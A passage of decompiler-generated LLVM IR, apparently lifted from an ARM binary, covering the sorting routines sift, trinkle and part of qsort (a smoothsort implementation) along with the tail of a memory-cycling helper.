  store i32 %.v1_f230, i32* @r6, align 4
  %v0_f238 = load i32, i32* @sb, align 4
  %v1_f238 = inttoptr i32 %v0_f238 to i32*
  %v2_f238 = load i32, i32* %v1_f238, align 4
  store i32 %v2_f238, i32* %r0.global-to-local, align 4
  %v0_f23c = load i32, i32* @r7, align 4
  %v1_f23c = inttoptr i32 %v0_f23c to i32*
  %v2_f23c = load i32, i32* %v1_f23c, align 4
  %v3_f244 = inttoptr i32 %v2_f238 to i16*
  %v4_f244 = call i32 @memcpy(i16* %v3_f244, i32 %v2_f23c, i32 %.v1_f230)
  store i32 %v4_f244, i32* %r0.global-to-local, align 4
  %v0_f248 = load i32, i32* @r7, align 4
  store i32 %v0_f248, i32* @r4, align 4
  %v0_f24c = load i32, i32* @fp, align 4
  store i32 %v0_f24c, i32* @r5, align 4
  br label %dec_label_pc_f250

dec_label_pc_f250:                                ; preds = %dec_label_pc_f250, %dec_label_pc_f22c
  %v0_f250 = phi i32 [ %v4_f26c, %dec_label_pc_f250 ], [ %v0_f248, %dec_label_pc_f22c ]
  %v1_f250 = inttoptr i32 %v0_f250 to i32*
  %v2_f250 = load i32, i32* %v1_f250, align 4
  store i32 %v2_f250, i32* %r0.global-to-local, align 4
  %v3_f250 = add i32 %v0_f250, 4
  %v4_f250 = inttoptr i32 %v3_f250 to i32*
  %v5_f250 = load i32, i32* %v4_f250, align 4
  %v0_f254 = load i32, i32* @r6, align 4
  %v3_f258 = inttoptr i32 %v2_f250 to i16*
  %v4_f258 = call i32 @memcpy(i16* %v3_f258, i32 %v5_f250, i32 %v0_f254)
  store i32 %v4_f258, i32* %r0.global-to-local, align 4
  %v0_f25c = load i32, i32* @r4, align 4
  %v1_f25c = inttoptr i32 %v0_f25c to i32*
  %v2_f25c = load i32, i32* %v1_f25c, align 4
  %v0_f260 = load i32, i32* @r5, align 4
  %v1_f260 = add i32 %v0_f260, 1
  store i32 %v1_f260, i32* @r5, align 4
  %v1_f264 = load i32, i32* @r6, align 4
  %v2_f264 = add i32 %v1_f264, %v2_f25c
  store i32 %v2_f264, i32* @r3, align 4
  %v1_f268 = load i32, i32* @sl, align 4
  %v9_f268 = icmp eq i32 %v1_f260, %v1_f268
  store i32 %v2_f264, i32* %v1_f25c, align 4
  %v3_f26c = load i32, i32* @r4, align 4
  %v4_f26c = add i32 %v3_f26c, 4
  store i32 %v4_f26c, i32* @r4, align 4
  br i1 %v9_f268, label %dec_label_pc_f274, label %dec_label_pc_f250

dec_label_pc_f274:                                ; preds = %dec_label_pc_f250
  %v0_f274 = load i32, i32* @r6, align 4
  %v1_f274 = load i32, i32* @r8, align 4
  %v2_f274 = sub i32 %v1_f274, %v0_f274
  store i32 %v2_f274, i32* @r8, align 4
  %v2_f278 = icmp eq i32 %v2_f274, 0
  br i1 %v2_f278, label %dec_label_pc_f280.loopexit, label %dec_label_pc_f22c

dec_label_pc_f280.loopexit:                       ; preds = %dec_label_pc_f274, %dec_label_pc_f218
  %v1_f288.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f280

dec_label_pc_f280:                                ; preds = %dec_label_pc_f280.loopexit, %entry
  %v1_f288 = phi i32 [ %v1_f288.pre, %dec_label_pc_f280.loopexit ], [ %v0_f20c, %entry ]
  store i32 %v3_f1fc, i32* @r4, align 4
  store i32 %v6_f1fc, i32* @r5, align 4
  store i32 %v9_f1fc, i32* @r6, align 4
  store i32 %v12_f1fc, i32* @r7, align 4
  store i32 %v15_f1fc, i32* @r8, align 4
  store i32 %v18_f1fc, i32* @sb, align 4
  store i32 %v21_f1fc, i32* @sl, align 4
  store i32 %v24_f1fc, i32* @fp, align 4
  ret i32 %v1_f288

; uselistorder directives
  uselistorder i32 %v2_f274, { 1, 2, 0 }
  uselistorder i32 %v4_f26c, { 1, 0 }
  uselistorder i32 %v0_f250, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 6, 5, 0, 1 }
  uselistorder label %dec_label_pc_f22c, { 1, 0 }
}

define i32 @sift(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-268 = alloca i32, align 4
  %v3_f28c = load i32, i32* @r4, align 4
  %v6_f28c = load i32, i32* @r5, align 4
  %v9_f28c = load i32, i32* @r6, align 4
  %v12_f28c = load i32, i32* @r7, align 4
  %v15_f28c = load i32, i32* @r8, align 4
  %v18_f28c = load i32, i32* @sb, align 4
  %v21_f28c = load i32, i32* @sl, align 4
  %v24_f28c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r6, align 4
  %v2_f2a0 = ptrtoint i32* %stack_var_-268 to i32
  store i32 %v2_f2a0, i32* @r8, align 4
  store i32 2, i32* @sb, align 4
  %v0_f2a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f2a8, i32* %stack_var_-268, align 4
  br label %dec_label_pc_f31c

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f31c
  %v1_f2b0 = add i32 %v5_f324, -8
  %v2_f2b0 = inttoptr i32 %v1_f2b0 to i32*
  %v3_f2b0 = load i32, i32* %v2_f2b0, align 4
  store i32 %v3_f2b0, i32* @r3, align 4
  %v2_f2b4 = sub i32 %v2_f328, %v3_f2b0
  store i32 %v2_f2b4, i32* @r4, align 4
  %v3_f2bc = load i32, i32* %stack_var_-268, align 4
  store i32 %v3_f2bc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v1_f2c8 = icmp slt i32 %v3_f2bc, 0
  br i1 %v1_f2c8, label %dec_label_pc_f2e8, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2b0
  %v3_f2d4 = load i32, i32* %stack_var_-268, align 4
  store i32 %v3_f2d4, i32* %r0.global-to-local, align 4
  store i32 62176, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v1_f2e0 = icmp slt i32 %v3_f2d4, 0
  br i1 %v1_f2e0, label %dec_label_pc_f2d4.dec_label_pc_f2e8_crit_edge, label %dec_label_pc_f2d4.dec_label_pc_f334_crit_edge

dec_label_pc_f2d4.dec_label_pc_f2e8_crit_edge:    ; preds = %dec_label_pc_f2d4
  br label %dec_label_pc_f2e8

dec_label_pc_f2d4.dec_label_pc_f334_crit_edge:    ; preds = %dec_label_pc_f2d4
  %v0_f334.pre = load i32, i32* @fp, align 4
  %v0_f338.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_f334

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2d4.dec_label_pc_f2e8_crit_edge, %dec_label_pc_f2b0
  %v0_f2e8 = load i32, i32* @r4, align 4
  store i32 %v0_f2e8, i32* %r0.global-to-local, align 4
  store i32 62200, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v1_f2f8 = icmp slt i32 %v0_f2e8, 0
  br i1 %v1_f2f8, label %bb, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_f2e8
  %v3_f2fc = load i32, i32* @r4, align 4
  %v4_f2fc = load i32, i32* @r8, align 4
  %v5_f2fc = add i32 %v4_f2fc, 4
  %v6_f2fc = inttoptr i32 %v5_f2fc to i32*
  store i32 %v3_f2fc, i32* %v6_f2fc, align 4
  %v0_f300 = load i32, i32* @r4, align 4
  store i32 %v0_f300, i32* %r0.global-to-local, align 4
  %v3_f308 = load i32, i32* @r6, align 4
  %v4_f308 = add i32 %v3_f308, -1
  store i32 %v4_f308, i32* @r6, align 4
  br label %bb23

bb:                                               ; preds = %dec_label_pc_f2e8
  %v3_f304 = load i32, i32* @r5, align 4
  %v4_f304 = load i32, i32* @r8, align 4
  %v5_f304 = add i32 %v4_f304, 4
  %v6_f304 = inttoptr i32 %v5_f304 to i32*
  store i32 %v3_f304, i32* %v6_f304, align 4
  %v3_f30c = load i32, i32* @r6, align 4
  %v4_f30c = add i32 %v3_f30c, -2
  store i32 %v4_f30c, i32* @r6, align 4
  %v3_f310 = load i32, i32* @r5, align 4
  store i32 %v3_f310, i32* %r0.global-to-local, align 4
  br label %bb23

bb23:                                             ; preds = %._crit_edge, %bb
  %v0_f320.pre = phi i32 [ %v4_f308, %._crit_edge ], [ %v4_f30c, %bb ]
  %v1_f328.pre = phi i32 [ %v0_f300, %._crit_edge ], [ %v3_f310, %bb ]
  %v0_f314 = load i32, i32* @sb, align 4
  %v1_f314 = add i32 %v0_f314, 1
  store i32 %v1_f314, i32* @sb, align 4
  %v0_f318 = load i32, i32* @r8, align 4
  %v1_f318 = add i32 %v0_f318, 4
  store i32 %v1_f318, i32* @r8, align 4
  %v3_f31c.pre = load i32, i32* %stack_var_0, align 4
  %v0_f328.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %entry, %bb23
  %v0_f32c = phi i32 [ 2, %entry ], [ %v1_f314, %bb23 ]
  %v1_f328 = phi i32 [ %v0_f2a8, %entry ], [ %v1_f328.pre, %bb23 ]
  %v0_f328 = phi i32 [ %arg2, %entry ], [ %v0_f328.pre, %bb23 ]
  %v1_f324 = phi i32 [ %arg4, %entry ], [ %v0_f320.pre, %bb23 ]
  %v3_f31c = phi i32 [ %arg5, %entry ], [ %v3_f31c.pre, %bb23 ]
  %v4_f324 = mul i32 %v1_f324, 4
  %v5_f324 = add i32 %v4_f324, %v3_f31c
  store i32 %v5_f324, i32* @r3, align 4
  %v2_f328 = sub i32 %v1_f328, %v0_f328
  store i32 %v2_f328, i32* @r5, align 4
  %v1_f32c = add i32 %v0_f32c, -1
  store i32 %v1_f32c, i32* @sl, align 4
  %v8_f330 = icmp sgt i32 %v1_f324, 1
  br i1 %v8_f330, label %dec_label_pc_f2b0, label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %dec_label_pc_f31c, %dec_label_pc_f2d4.dec_label_pc_f334_crit_edge
  %v0_f338 = phi i32 [ %v0_f338.pre, %dec_label_pc_f2d4.dec_label_pc_f334_crit_edge ], [ %v1_f32c, %dec_label_pc_f31c ]
  %v0_f334 = phi i32 [ %v0_f334.pre, %dec_label_pc_f2d4.dec_label_pc_f334_crit_edge ], [ %v0_f328, %dec_label_pc_f31c ]
  store i32 %v0_f334, i32* %r0.global-to-local, align 4
  %v4_f340 = call i32 @cycle(i32 %v0_f334, i32* nonnull %stack_var_-268, i32 %v0_f338)
  store i32 %v4_f340, i32* %r0.global-to-local, align 4
  store i32 %v3_f28c, i32* @r4, align 4
  store i32 %v6_f28c, i32* @r5, align 4
  store i32 %v9_f28c, i32* @r6, align 4
  store i32 %v12_f28c, i32* @r7, align 4
  store i32 %v15_f28c, i32* @r8, align 4
  store i32 %v18_f28c, i32* @sb, align 4
  store i32 %v21_f28c, i32* @sl, align 4
  store i32 %v24_f28c, i32* @fp, align 4
  ret i32 %v4_f340

; uselistorder directives
  uselistorder i32 %v0_f334, { 1, 0 }
  uselistorder i32 %v2_f328, { 1, 0 }
  uselistorder i32 %v5_f324, { 1, 0 }
  uselistorder i32 %v1_f324, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_f31c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @trinkle(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v3_f350 = load i32, i32* @r4, align 4
  %v6_f350 = load i32, i32* @r5, align 4
  %v9_f350 = load i32, i32* @r6, align 4
  %v12_f350 = load i32, i32* @r7, align 4
  %v15_f350 = load i32, i32* @r8, align 4
  %v18_f350 = load i32, i32* @sb, align 4
  %v21_f350 = load i32, i32* @sl, align 4
  %v24_f350 = load i32, i32* @fp, align 4
  %v27_f350 = load i32, i32* @lr, align 4
  %v1_f358 = add i32 %tmp, 4
  %v2_f358 = inttoptr i32 %v1_f358 to i32*
  %v3_f358 = load i32, i32* %v2_f358, align 4
  store i32 %v3_f358, i32* @ip, align 4
  store i32 %arg5, i32* @r7, align 4
  %v2_f360 = load i32, i32* %arg4, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg3, i32* @sl, align 4
  %v0_f36c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f36c, i32* @r6, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v2_f360, i32* %stack_var_-48, align 4
  store i32 %v0_f36c, i32* %stack_var_-276, align 4
  %v2_f458 = icmp eq i32 %v3_f358, 0
  %v2_f408 = ptrtoint i32* %stack_var_-276 to i32
  %v2_f410 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_f440

dec_label_pc_f38c:                                ; preds = %dec_label_pc_f454, %dec_label_pc_f440
  store i32 %arg7, i32* @ip, align 4
  %v2_f390 = add i32 %v3_f448, %arg7
  %v3_f390 = inttoptr i32 %v2_f390 to i32*
  %v4_f390 = load i32, i32* %v3_f390, align 4
  store i32 %v4_f390, i32* @r3, align 4
  %v2_f394 = sub i32 %v1_f394, %v4_f390
  store i32 %v2_f394, i32* @r5, align 4
  store i32 %v2_f394, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg3)
  store i32 %arg7, i32* @lr, align 4
  %v0_f3b0 = load i32, i32* @r4, align 4
  %v2_f3b0 = add i32 %v0_f3b0, %arg7
  %v0_f3b4 = load i32, i32* @r5, align 4
  %v0_f3b8 = load i32, i32* @fp, align 4
  store i32 %v0_f3b8, i32* %r0.global-to-local, align 4
  %tmp29 = icmp slt i32 %v2_f394, 1
  br i1 %tmp29, label %dec_label_pc_f460, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f38c
  %v0_f3c0 = load i32, i32* @r8, align 4
  %v1_f3c0 = sub i32 1, %v0_f3c0
  %v2_f3c0 = icmp ult i32 %v0_f3c0, 2
  br i1 %v2_f3c0, label %bb30, label %bb

bb:                                               ; preds = %dec_label_pc_f3c0
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_f3c0, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_f3c0, %dec_label_pc_f3c0 ]
  %v0_f3d0.pr = phi i32 [ 0, %bb ], [ %v1_f3c0, %dec_label_pc_f3c0 ]
  store i32 %storemerge, i32* @r3, align 4
  %v0_f3c8 = load i32, i32* @r7, align 4
  %v7_f3cc = icmp slt i32 %v0_f3c8, 2
  br i1 %v7_f3cc, label %.thread, label %bb31

.thread:                                          ; preds = %bb30
  br label %dec_label_pc_f404

bb31:                                             ; preds = %bb30
  %v2_f3d0 = icmp eq i32 %v0_f3d0.pr, 0
  br i1 %v2_f3d0, label %dec_label_pc_f404, label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %bb31
  %v1_f3d8 = add i32 %v2_f3b0, -8
  %v2_f3d8 = inttoptr i32 %v1_f3d8 to i32*
  %v3_f3d8 = load i32, i32* %v2_f3d8, align 4
  store i32 %v3_f3d8, i32* @r4, align 4
  store i32 62436, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v0_f3e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f3e4 = icmp slt i32 %v0_f3e4, 0
  %v0_f3ec = load i32, i32* @r4, align 4
  %v1_f3ec = load i32, i32* @fp, align 4
  %v2_f3ec = sub i32 %v1_f3ec, %v0_f3ec
  store i32 %v2_f3ec, i32* %r0.global-to-local, align 4
  br i1 %v1_f3e4, label %dec_label_pc_f3f4, label %dec_label_pc_f460

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f3d8
  store i32 62460, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v0_f3fc = load i32, i32* %r0.global-to-local, align 4
  %v1_f3fc = icmp slt i32 %v0_f3fc, 0
  br i1 %v1_f3fc, label %dec_label_pc_f3f4.dec_label_pc_f404_crit_edge, label %dec_label_pc_f460

dec_label_pc_f3f4.dec_label_pc_f404_crit_edge:    ; preds = %dec_label_pc_f3f4
  %v0_f40c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3f4.dec_label_pc_f404_crit_edge, %.thread, %bb31
  %v0_f40c = phi i32 [ %v0_f40c.pre, %dec_label_pc_f3f4.dec_label_pc_f404_crit_edge ], [ %v0_f3b4, %.thread ], [ %v0_f3b4, %bb31 ]
  %v5_f40c = mul i32 %stack_var_-284.0, 4
  %v6_f40c = add i32 %v5_f40c, %v2_f408
  %v7_f40c = inttoptr i32 %v6_f40c to i32*
  store i32 %v0_f40c, i32* %v7_f40c, align 4
  store i32 %v2_f410, i32* %r0.global-to-local, align 4
  %v2_f414 = call i32 @pntz(i32* nonnull %stack_var_-48)
  store i32 %v2_f414, i32* %r4.global-to-local, align 4
  store i32 %v2_f410, i32* %r0.global-to-local, align 4
  %v3_f424 = call i32 @shr(i32* nonnull %stack_var_-48, i32 %v2_f414)
  store i32 %v3_f424, i32* %r0.global-to-local, align 4
  %v1_f42c = add i32 %stack_var_-284.0, 1
  store i32 %v1_f42c, i32* @ip, align 4
  %v0_f434 = load i32, i32* @r7, align 4
  %v1_f434 = load i32, i32* %r4.global-to-local, align 4
  %v2_f434 = add i32 %v1_f434, %v0_f434
  store i32 %v2_f434, i32* @r7, align 4
  %v0_f438 = load i32, i32* @r5, align 4
  store i32 %v0_f438, i32* @r6, align 4
  store i32 0, i32* @r8, align 4
  %v3_f440.pre = load i32, i32* %stack_var_-48, align 4
  %v0_f44c.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_f440

dec_label_pc_f440:                                ; preds = %entry, %dec_label_pc_f404
  %v1_f394 = phi i32 [ %v0_f36c, %entry ], [ %v0_f438, %dec_label_pc_f404 ]
  %v1_f49c11 = phi i32 [ %v0_f36c, %entry ], [ %v3_f424, %dec_label_pc_f404 ]
  %v0_f44c = phi i32 [ %arg2, %entry ], [ %v0_f44c.pre, %dec_label_pc_f404 ]
  %v0_f448 = phi i32 [ %arg5, %entry ], [ %v2_f434, %dec_label_pc_f404 ]
  %v3_f440 = phi i32 [ %v2_f360, %entry ], [ %v3_f440.pre, %dec_label_pc_f404 ]
  %stack_var_-284.0 = phi i32 [ 1, %entry ], [ %v1_f42c, %dec_label_pc_f404 ]
  %v7_f444 = icmp eq i32 %v3_f440, 1
  %v3_f448 = mul i32 %v0_f448, 4
  store i32 %v3_f448, i32* @r4, align 4
  %v2_f44c = sub i32 %v1_f394, %v0_f44c
  store i32 %v2_f44c, i32* @fp, align 4
  br i1 %v7_f444, label %dec_label_pc_f454, label %dec_label_pc_f38c

dec_label_pc_f454:                                ; preds = %dec_label_pc_f440
  store i32 %v3_f358, i32* @r3, align 4
  br i1 %v2_f458, label %dec_label_pc_f460, label %dec_label_pc_f38c

dec_label_pc_f460:                                ; preds = %dec_label_pc_f3f4, %dec_label_pc_f3d8, %dec_label_pc_f454, %dec_label_pc_f38c
  %v1_f49c10 = phi i32 [ %v0_f3fc, %dec_label_pc_f3f4 ], [ %v2_f3ec, %dec_label_pc_f3d8 ], [ %v1_f49c11, %dec_label_pc_f454 ], [ %v0_f3b8, %dec_label_pc_f38c ]
  %v0_f460 = load i32, i32* @r8, align 4
  %v2_f460 = icmp eq i32 %v0_f460, 0
  br i1 %v2_f460, label %dec_label_pc_f468, label %dec_label_pc_f494

dec_label_pc_f468:                                ; preds = %dec_label_pc_f460
  %v0_f46c = load i32, i32* @sb, align 4
  store i32 %v0_f46c, i32* %r0.global-to-local, align 4
  %v4_f474 = call i32 @cycle(i32 %v0_f46c, i32* nonnull %stack_var_-276, i32 %stack_var_-284.0)
  store i32 %arg7, i32* @lr, align 4
  %v0_f47c = load i32, i32* @r6, align 4
  store i32 %v0_f47c, i32* %r0.global-to-local, align 4
  %v0_f480 = load i32, i32* @sb, align 4
  %v0_f488 = load i32, i32* @r7, align 4
  %v5_f490 = call i32 @sift(i32 %v0_f47c, i32 %v0_f480, i32 %arg3, i32 %v0_f488, i32 %arg7)
  store i32 %v5_f490, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f460, %dec_label_pc_f468
  %v1_f49c = phi i32 [ %v1_f49c10, %dec_label_pc_f460 ], [ %v5_f490, %dec_label_pc_f468 ]
  store i32 %v3_f350, i32* @r4, align 4
  store i32 %v6_f350, i32* @r5, align 4
  store i32 %v9_f350, i32* @r6, align 4
  store i32 %v12_f350, i32* @r7, align 4
  store i32 %v15_f350, i32* @r8, align 4
  store i32 %v18_f350, i32* @sb, align 4
  store i32 %v21_f350, i32* @sl, align 4
  store i32 %v24_f350, i32* @fp, align 4
  store i32 %v27_f350, i32* @lr, align 4
  ret i32 %v1_f49c

; uselistorder directives
  uselistorder i32 %stack_var_-284.0, { 0, 2, 1 }
  uselistorder i32 %v1_f394, { 1, 0 }
  uselistorder i32 %v3_f358, { 1, 0, 2 }
  uselistorder i32* %stack_var_-276, { 0, 2, 1 }
  uselistorder i32* %stack_var_-48, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 0, 1 }
  uselistorder i32 %arg7, { 2, 5, 0, 4, 1, 3 }
  uselistorder i32 %arg3, { 3, 1, 2, 4, 0 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_f440, { 1, 0 }
  uselistorder label %dec_label_pc_f404, { 0, 2, 1 }
  uselistorder label %bb30, { 1, 0 }
}

define i32 @qsort(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_f4a0 = mul i32 %arg3, %arg2
  store i32 %v2_f4a0, i32* @ip, align 4
  %v12_f4a4 = load i32, i32* @r7, align 4
  %v27_f4a4 = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %lr.global-to-local, align 4
  %v2_f4bc = icmp eq i32 %v2_f4a0, 0
  %v2_f4c0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f4c0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  store i32 %arg4, i32* @sb, align 4
  br i1 %v2_f4bc, label %dec_label_pc_f714, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %entry
  %v2_f4d0 = sub i32 %arg1, %arg3
  %v2_f4d4 = add i32 %v2_f4d0, %v2_f4a0
  store i32 %arg3, i32* %stack_var_-240, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_f4e8 = ptrtoint i32* %stack_var_-240 to i32
  store i32 %v2_f4e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge, %dec_label_pc_f4d0
  %v1_f4f8 = phi i32 [ %v1_f4f8.pre, %dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge ], [ %v2_f4a0, %dec_label_pc_f4d0 ]
  %v1_f4f4 = phi i32 [ %v1_f4f4.pre, %dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge ], [ %arg3, %dec_label_pc_f4d0 ]
  %v1_f4fc = phi i32 [ %v1_f500, %dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge ], [ %v2_f4e8, %dec_label_pc_f4d0 ]
  %v1_f4ec = inttoptr i32 %v1_f4fc to i32*
  %v2_f4ec = load i32, i32* %v1_f4ec, align 4
  %v3_f4ec = add i32 %v1_f4fc, 4
  %v4_f4ec = inttoptr i32 %v3_f4ec to i32*
  %v5_f4ec = load i32, i32* %v4_f4ec, align 4
  %v2_f4f0 = add i32 %v2_f4ec, %v1_f4f4
  %v2_f4f4 = add i32 %v2_f4f0, %v5_f4ec
  %v3_f4f8 = icmp ult i32 %v2_f4f4, %v1_f4f8
  %v2_f4fc = add i32 %v1_f4fc, 8
  %v3_f4fc = inttoptr i32 %v2_f4fc to i32*
  store i32 %v2_f4f4, i32* %v3_f4fc, align 4
  %v0_f500 = load i32, i32* %r2.global-to-local, align 4
  %v1_f500 = add i32 %v0_f500, 4
  store i32 %v1_f500, i32* %r2.global-to-local, align 4
  br i1 %v3_f4f8, label %dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge, label %dec_label_pc_f508

dec_label_pc_f4ec.dec_label_pc_f4ec_crit_edge:    ; preds = %dec_label_pc_f4ec
  %v1_f4f4.pre = load i32, i32* @r6, align 4
  %v1_f4f8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_f4ec

dec_label_pc_f508:                                ; preds = %dec_label_pc_f4ec
  store i32 %v2_f4d4, i32* %r2.global-to-local, align 4
  %v0_f50c = load i32, i32* @r6, align 4
  store i32 1, i32* @r7, align 4
  %v0_f514 = load i32, i32* %lr.global-to-local, align 4
  %v2_f514 = sub i32 %v2_f4d4, %v0_f514
  store i32 %v2_f514, i32* @r4, align 4
  store i32 %v2_f4e8, i32* @fp, align 4
  store i32 %v2_f4c0, i32* @sl, align 4
  %v2_f5e8 = ptrtoint i32* %stack_var_-40 to i32
  %v0_f5ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f5e0

dec_label_pc_f528:                                ; preds = %dec_label_pc_f5e0
  %v3_f528 = load i32, i32* %stack_var_-48, align 4
  %v1_f52c = urem i32 %v3_f528, 4
  store i32 %v1_f52c, i32* @ip, align 4
  %v2_f530 = icmp eq i32 %v1_f52c, 3
  %v0_f53c = load i32, i32* @sb, align 4
  store i32 %v0_f53c, i32* %r2.global-to-local, align 4
  br i1 %v2_f530, label %dec_label_pc_f548, label %dec_label_pc_f568

dec_label_pc_f548:                                ; preds = %dec_label_pc_f528
  %v5_f550 = call i32 @sift(i32 %v0_f604, i32 %v0_f608, i32 %v0_f53c, i32 %v2_f618, i32 %v2_f4e8)
  %v3_f55c = call i32 @shr(i32* nonnull %stack_var_-48, i32 2)
  %v0_f560 = load i32, i32* @r7, align 4
  %v1_f560 = add i32 %v0_f560, 2
  store i32 %v1_f560, i32* @r7, align 4
  br label %dec_label_pc_f5c8

dec_label_pc_f568:                                ; preds = %dec_label_pc_f528
  %v1_f568 = add i32 %v5_f5f0, -200
  %v2_f568 = inttoptr i32 %v1_f568 to i32*
  %v3_f568 = load i32, i32* %v2_f568, align 4
  store i32 %v3_f568, i32* @ip, align 4
  %v3_f56c = icmp ult i32 %v3_f568, %v1_f56c
  br i1 %v3_f56c, label %dec_label_pc_f588, label %dec_label_pc_f574

dec_label_pc_f574:                                ; preds = %dec_label_pc_f568
  %v8_f580 = call i32 @trinkle(i32 %v0_f604, i32 %v0_f608, i32 %v0_f53c, i32* nonnull %stack_var_-48, i32 %v2_f618, i32 0, i32 %v2_f4e8)
  br label %dec_label_pc_f5a0

dec_label_pc_f588:                                ; preds = %dec_label_pc_f568
  store i32 %v0_f53c, i32* %r2.global-to-local, align 4
  %v5_f59c = call i32 @sift(i32 %v0_f604, i32 %v0_f608, i32 %v0_f53c, i32 %v2_f618, i32 %v2_f4e8)
  br label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f574, %dec_label_pc_f588
  %v0_f5a0 = load i32, i32* @r7, align 4
  %v7_f5a0 = icmp eq i32 %v0_f5a0, 1
  br i1 %v7_f5a0, label %dec_label_pc_f5b0, label %dec_label_pc_f5c0

dec_label_pc_f5b0:                                ; preds = %dec_label_pc_f5a0
  %v3_f5b4 = call i32 @shl(i32* nonnull %stack_var_-48, i32 1)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_f5c8

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f5a0
  %v0_f5a4 = load i32, i32* @r5, align 4
  store i32 1, i32* @r7, align 4
  %v3_f5c4 = call i32 @shl(i32* nonnull %stack_var_-48, i32 %v0_f5a4)
  %v0_f5e4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f5c8

dec_label_pc_f5c8:                                ; preds = %dec_label_pc_f5b0, %dec_label_pc_f548, %dec_label_pc_f5c0
  %v0_f5e4.pre = phi i32 [ 0, %dec_label_pc_f5b0 ], [ %v1_f560, %dec_label_pc_f548 ], [ %v0_f5e4.pre.pre, %dec_label_pc_f5c0 ]
  %v3_f5c8 = load i32, i32* %stack_var_-48, align 4
  %v1_f5d0 = or i32 %v3_f5c8, 1
  store i32 %v1_f5d0, i32* %stack_var_-48, align 4
  %v0_f5d8 = load i32, i32* @r8, align 4
  %v1_f5d8 = load i32, i32* @r6, align 4
  %v2_f5d8 = add i32 %v1_f5d8, %v0_f5d8
  store i32 %v2_f5d8, i32* @r8, align 4
  %v0_f5dc = load i32, i32* @r4, align 4
  %v2_f5dc = sub i32 %v0_f5dc, %v0_f50c
  store i32 %v2_f5dc, i32* @r4, align 4
